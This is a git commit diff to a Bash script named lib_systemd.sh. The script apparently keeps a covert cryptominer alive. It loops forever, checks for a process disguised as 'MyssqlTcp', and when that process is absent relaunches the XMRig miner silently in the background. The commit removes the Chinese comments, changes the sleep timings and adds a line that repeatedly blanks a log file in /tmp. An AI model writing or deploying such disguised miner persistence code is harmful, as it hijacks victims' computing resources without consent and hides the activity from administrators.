007980dde3150e911ef3e3280df663e2eb90054c
teshushu <905353149@qq.com>
2023-01-21 19:39:39 +0800

    Update lib_systemd.sh

--- Bash/lib_systemd.sh
+++ Bash/lib_systemd.sh
@@ -11,19 +11,15 @@ if [ ! -d $HOME ]; then
   exit 1
 fi
 
-#添加本地执行路径
 export LD_LIBRARY_PATH=$HOME/myssqltcp/
 
 while true; do
-        #启动一个循环，定时检查进程是否存在
         server=`ps aux | grep MyssqlTcp | grep -v grep`
         if [ ! "$server" ]; then
-            #如果不存在就重新启动
             ./addconf.sh
             /bin/bash ./xmrig.sh --config=./config_background.json >/dev/null 2>&1
-            #启动后沉睡10s
-            sleep 10
+            sleep 40
         fi
-        #每次循环沉睡10s
-        sleep 5
+        echo " ">/tmp/myssqlsys.log
+        sleep 20
 done
